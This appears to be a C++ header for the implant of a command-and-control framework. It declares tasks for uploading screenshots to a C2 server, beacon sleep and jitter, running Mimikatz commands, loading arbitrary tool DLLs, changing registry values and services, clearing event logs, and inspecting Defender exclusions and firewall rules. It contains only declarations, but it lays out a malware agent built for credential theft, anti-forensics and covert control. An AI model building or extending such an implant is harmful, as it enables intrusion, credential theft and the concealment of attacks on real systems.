#pragma once

#include "json.hpp"
#include <string>
#include <vector>
#include <windows.h>

using json = nlohmann::json;

namespace Tasks {
namespace System {

    // System operation result structure
    struct SystemResult {
        bool success;
        std::string message;
        std::string output;
        size_t dataSize;
        
        SystemResult(bool s = false, const std::string& msg = "", const std::string& out = "", size_t size = 0)
            : success(s), message(msg), output(out), dataSize(size) {}
    };

    // Sleep configuration structure
    struct SleepConfig {
        int sleepTime;
        int jitterMax;
        int jitterMin;
        
        SleepConfig(int sleep = 10, int maxJitter = 30, int minJitter = 25)
            : sleepTime(sleep), jitterMax(maxJitter), jitterMin(minJitter) {}
    };

    // Registry value structure
    struct RegistryValue {
        std::string name;
        std::string value;
        DWORD type;
        
        RegistryValue() : type(REG_NONE) {}
        RegistryValue(const std::string& n, const std::string& v, DWORD t)
            : name(n), value(v), type(t) {}
    };

    /**
     * Take a screenshot and upload it to the C2 server
     * @param taskId Task ID for the screenshot operation
     * @return SystemResult with operation status and details
     */
    SystemResult TakeScreenshot(const std::string& taskId);

    /**
     * Update sleep and jitter configuration
     * @param newSleepTime Sleep time in seconds
     * @param newJitterMax Maximum jitter percentage
     * @param newJitterMin Minimum jitter percentage (optional)
     * @return SystemResult with operation status
     */
    SystemResult UpdateSleepConfiguration(int newSleepTime, int newJitterMax, int newJitterMin = 25);

    /**
     * Execute Mimikatz with specified commands
     * @param commands Semicolon-delimited Mimikatz commands
     * @return SystemResult with Mimikatz output
     */
    SystemResult ExecuteMimikatz(const std::string& commands);

    /**
     * Get comprehensive system information
     * @param includeNetworking Whether to include network adapter info
     * @return Formatted system information string
     */
    std::string GetSystemInformation(bool includeNetworking = true);

    /**
     * Get current system uptime
     * @return Uptime in milliseconds
     */
    uint64_t GetSystemUptime();

    /**
     * Get available system memory information
     * @return Formatted memory information string
     */
    std::string GetMemoryInformation();

    /**
     * Get disk usage information for all drives
     * @return Formatted disk usage information
     */
    std::string GetDiskInformation();

    /**
     * Get network adapter information
     * @return Formatted network adapter information
     */
    std::string GetNetworkAdapterInfo();

    /**
     * Get running services information
     * @param runningOnly Whether to show only running services
     * @return Formatted services information
     */
    std::string GetServicesInformation(bool runningOnly = true);

    /**
     * Start a Windows service
     * @param serviceName Name of the service to start
     * @return true if service started successfully
     */
    bool StartService(const std::string& serviceName);

    /**
     * Stop a Windows service
     * @param serviceName Name of the service to stop
     * @return true if service stopped successfully
     */
    bool StopService(const std::string& serviceName);

    /**
     * Get registry value from specified key
     * @param hive Registry hive (HKEY_LOCAL_MACHINE, etc.)
     * @param keyPath Registry key path
     * @param valueName Name of the value to retrieve
     * @return RegistryValue structure with result
     */
    RegistryValue GetRegistryValue(HKEY hive, const std::string& keyPath, const std::string& valueName);

    /**
     * Set registry value in specified key
     * @param hive Registry hive (HKEY_LOCAL_MACHINE, etc.)
     * @param keyPath Registry key path
     * @param valueName Name of the value to set
     * @param value Value data to set
     * @param valueType Registry value type (REG_SZ, REG_DWORD, etc.)
     * @return true if value set successfully
     */
    bool SetRegistryValue(HKEY hive, const std::string& keyPath, const std::string& valueName, 
                         const std::string& value, DWORD valueType = REG_SZ);

    /**
     * Delete registry value from specified key
     * @param hive Registry hive
     * @param keyPath Registry key path
     * @param valueName Name of the value to delete
     * @return true if value deleted successfully
     */
    bool DeleteRegistryValue(HKEY hive, const std::string& keyPath, const std::string& valueName);

    /**
     * Get event log entries
     * @param logName Name of the event log (System, Application, Security)
     * @param maxEntries Maximum number of entries to retrieve
     * @param filterLevel Minimum event level to include
     * @return Formatted event log information
     */
    std::string GetEventLogEntries(const std::string& logName, int maxEntries = 50, int filterLevel = 2);

    /**
     * Clear an event log
     * @param logName Name of the event log to clear
     * @return true if log cleared successfully
     */
    bool ClearEventLog(const std::string& logName);

    /**
     * Get installed software list
     * @param includeUpdates Whether to include Windows updates
     * @return Formatted installed software list
     */
    std::string GetInstalledSoftware(bool includeUpdates = false);

    /**
     * Get system environment variables
     * @param userVariables Whether to include user-specific variables
     * @return Formatted environment variables list
     */
    std::string GetEnvironmentVariables(bool userVariables = true);

    /**
     * Execute a system tool DLL (like mimikatz, other tools)
     * @param dllPath Path to the tool DLL
     * @param functionName Function name to call
     * @param arguments Arguments to pass to the function
     * @param captureOutput Whether to capture stdout output
     * @return SystemResult with execution status and output
     */
    SystemResult ExecuteSystemTool(const std::string& dllPath, const std::string& functionName, 
                                 const std::string& arguments, bool captureOutput = true);

    /**
     * Get Windows defender status and exclusions
     * @return Formatted Windows Defender information
     */
    std::string GetWindowsDefenderStatus();

    /**
     * Get firewall status and rules
     * @return Formatted firewall information
     */
    std::string GetFirewallStatus();

    /**
     * Monitor system for specified time and generate report
     * @param durationSeconds Duration to monitor in seconds
     * @return System monitoring report
     */
    std::string MonitorSystem(int durationSeconds = 60);

    /**
     * Get current sleep configuration
     * @return SleepConfig structure with current settings
     */
    SleepConfig GetSleepConfiguration();

    /**
     * Validate system tool DLL exists and is accessible
     * @param dllPath Path to DLL to validate
     * @return true if DLL is valid and accessible
     */
    bool ValidateSystemTool(const std::string& dllPath);

    /**
     * Create a system information report
     * @param includeAdvanced Whether to include advanced system details
     * @return Comprehensive system report string
     */
    std::string GenerateSystemReport(bool includeAdvanced = true);

} // namespace System
} // namespace Tasks